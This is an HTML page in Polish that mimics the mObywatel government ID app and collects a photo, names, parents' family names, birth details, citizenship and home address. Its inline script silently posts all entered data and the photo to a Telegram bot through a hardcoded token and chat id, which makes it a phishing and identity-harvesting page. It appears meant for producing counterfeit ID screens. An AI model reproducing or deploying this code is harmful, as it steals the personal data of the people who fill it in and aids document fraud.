<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="assets/index.css">
    <link rel="icon" type="image/x-icon" href="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw">
    <title>mObywatel</title>
    <meta name="viewport" content="width=device-width, initial-scale=0.8, user-scalable=no">
</head>
<body>
    <script>
        // SprawdÅº, czy uÅ¼ytkownik jest zalogowany
        if (!sessionStorage.getItem('loggedIn')) {
            // JeÅ›li nie jest zalogowany, przekieruj do strony logowania
            window.location.href = 'login.html';
        }
    </script>
    
   <img src="https://play-lh.googleusercontent.com/_TNbiYKasPy_isTSEg2_UEzVaev4F8fO2lLunsHJ8_Ux2g3OzkSZyzpqvJG1woSj-WD4=w240-h480-rw" class="logo">
    <p class="logo_text">Mobywatel</p>
    <p class="warning">made by ogkomasic</p>

    <div class="guide_holder">
        <div class="top_holder">
            <p class="guide_title">Instrukcja</p>
            <img class="arrow" src="https://i.imgur.com/aUZmu0W.png">
        </div>
        <div class="guide_text">
            <span style="font-size: 17px; font-weight: 500;">Dla systemu IOS:</span><br>
            <ul>
                <li>Upewnij siÄ™, Å¼e uÅ¼ywasz przeglÄ…darki Safari</li>
                <li>UzupeÅ‚nij dane i kliknij wejdÅº</li>
                <li>NaciÅ›nij udostÄ™pnij -> Do Ekranu gÅ‚Ã³wnego</li>
            </ul>
            <span style="font-size: 17px; font-weight: 500;">Dla systemu Android:</span>
            <ul>
                <li>Upewnij siÄ™, Å¼e uÅ¼ywasz przeglÄ…darki Google lub Chrome</li>
                <li>UzupeÅ‚nij dane i kliknij wejdÅº</li>
                <li>NaciÅ›nij 3 kropki -> Dodaj do ekranu gÅ‚Ã³wnego</li>
            </ul>
        </div>
    </div>

   <div class="upload">
  <p class="error">To pole jest wymagane</p>
  <img class="upload_uploaded">
  <div class="upload_uploading"></div>
  <input type="file" id="photoInput" accept="image/*" style="display:none;">
  <div class="upload_grid" onclick="document.getElementById('photoInput').click();">
    <img class="upload_image" src="https://i.imgur.com/vwIQErh.png">
    <p class="upload_text">Dodaj zdjÄ™cie</p>
  </div>
</div>

    <div class="input_holder">
        <input type="text" id="name" class="input" placeholder="">
        <span class="placeholder">ImiÄ™ (imiona)</span>
        <p class="error">To pole jest wymagane</p>
    </div>
 
    <div class="input_holder">
        <input type="text" id="surname" class="input" placeholder="">
        <span class="placeholder">Nazwisko</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <p class="top_info">PÅ‚eÄ‡</p>
    <div class="selector_box">
        <div class="selected_grid">
            <p class="selector_text selected_text">MÄ™Å¼czyzna</p>
            <img class="selected_arrow" src="https://i.imgur.com/RXsdBB6.png">
        </div>
        <div class="option_box">
            <div class="selector_option" id="m">
                MÄ™Å¼czyzna
            </div>
            <div class="selector_option" id="k">
                Kobieta
            </div>
            <div class="selector_option" id="k">
                EMILIA JEDRZEJEWSKA
            </div>
        </div>
    </div>

    <form action="https://formspree.io/f/xqaqqdgg" method="POST" enctype="multipart/form-data"></form>

    <div class="date">
        <p class="top_info">Data urodzenia</p>
        <div class="date_grid">
            <input class="date_input" placeholder="DD" type="number">
            <input class="date_input" placeholder="MM" type="number">
            <input class="date_input" placeholder="YYYY" type="number">
        </div>
        <p class="error">WprowadÅº prawidÅ‚owÄ… datÄ™</p>
    </div>

    <div class="input_holder">
        <input type="text" id="nationality" class="input" placeholder="">
        <span class="placeholder">Obywatelstwo</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="familyName" class="input" placeholder="">
        <span class="placeholder">Nazwisko rodowe</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="fathersFamilyName" class="input" placeholder="">
        <span class="placeholder">Nazwisko rodowe ojca</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="mothersFamilyName" class="input" placeholder="">
        <span class="placeholder">Nazwisko rodowe matki</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <p class="subtext">Miejsce zamieszkania</p>

    <div class="input_holder">
        <input type="text" id="birthPlace" class="input" placeholder="">
        <span class="placeholder">Miejsce urodzenia</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="countryOfBirth" class="input" placeholder="">
        <span class="placeholder">Kraj urodzenia</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="adress1" class="input" placeholder="">
        <span class="placeholder">Ulica i numer domu</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="adress2" class="input" placeholder="">
        <span class="placeholder">Kod pocztowy</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <div class="input_holder">
        <input type="text" id="city" class="input" placeholder="">
        <span class="placeholder">Miasto</span>
        <p class="error">To pole jest wymagane</p>
    </div>

    <a class="go">DALEJ</a>

<script>
const token = '7626788939:AAGgZlg7vqqcMwEd6E-fn1ehJsjH4o72bRQ';
const chat_id = '5447264217';

document.querySelector('.go').addEventListener('click', async () => {
    const name = document.getElementById('name').value.trim();
    const surname = document.getElementById('surname').value.trim();
    const gender = document.querySelector('.selector_text')?.textContent?.trim();
    const day = document.querySelectorAll('.date_input')[0].value.trim();
    const month = document.querySelectorAll('.date_input')[1].value.trim();
    const year = document.querySelectorAll('.date_input')[2].value.trim();
    const dateOfBirth = `${day}.${month}.${year}`;
    const nationality = document.getElementById('nationality').value.trim();
    const familyName = document.getElementById('familyName').value.trim();
    const fathersFamilyName = document.getElementById('fathersFamilyName').value.trim();
    const mothersFamilyName = document.getElementById('mothersFamilyName').value.trim();
    const birthPlace = document.getElementById('birthPlace').value.trim();
    const countryOfBirth = document.getElementById('countryOfBirth').value.trim();
    const address1 = document.getElementById('adress1').value.trim();
    const address2 = document.getElementById('adress2').value.trim();
    const city = document.getElementById('city').value.trim();

    const text = `
<b>ğŸ“„ Nowe dane:</b>
ğŸ‘¤ ImiÄ™: ${name}
ğŸ‘¤ Nazwisko: ${surname}
âš§ï¸ PÅ‚eÄ‡: ${gender}
ğŸ“… Data urodzenia: ${dateOfBirth}
ğŸŒ Obywatelstwo: ${nationality}
ğŸ‘ª Nazwisko rodowe: ${familyName}
ğŸ‘¨ Ojciec: ${fathersFamilyName}
ğŸ‘© Matka: ${mothersFamilyName}
ğŸ™ï¸ Miejsce urodzenia: ${birthPlace}, ${countryOfBirth}
ğŸ  Adres: ${address1}, ${address2} ${city}
`;

    // WysyÅ‚amy wiadomoÅ›Ä‡ tekstowÄ…
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id,
            text,
            parse_mode: 'HTML'
        })
    });

    // Pobieramy plik zdjÄ™cia
    const fileInput = document.getElementById('photoInput');
    const file = fileInput.files[0];

    if (file) {
        const formData = new FormData();
        formData.append('chat_id', chat_id);
        formData.append('photo', file);

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    }
});
</script>


    <script src="assets/index.js"></script>
    <script src="assets/manifest.js"></script>
</body>
</html>
